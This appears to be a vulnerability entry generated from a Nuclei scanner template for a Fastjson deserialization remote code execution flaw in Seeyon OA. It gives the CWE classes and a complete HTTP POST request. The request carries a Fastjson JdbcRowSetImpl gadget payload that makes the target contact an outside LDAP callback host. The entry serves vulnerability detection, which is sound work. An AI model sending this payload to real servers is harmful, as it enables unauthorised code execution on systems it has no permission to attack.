# Vulnerability: Seeyon OA Fastjson Remote Code Execution
**Classification:** CWE-94,CWE-502
**Source:** Nuclei Template (`seeyon-oa-fastjson-rce.yaml`)

## Description
Seeyon OA Fastjson is vulnerable to RCE.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /seeyon/main.do?method=changeLocale HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

_json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{{interactsh-url}}","autoCommit":true}}
```

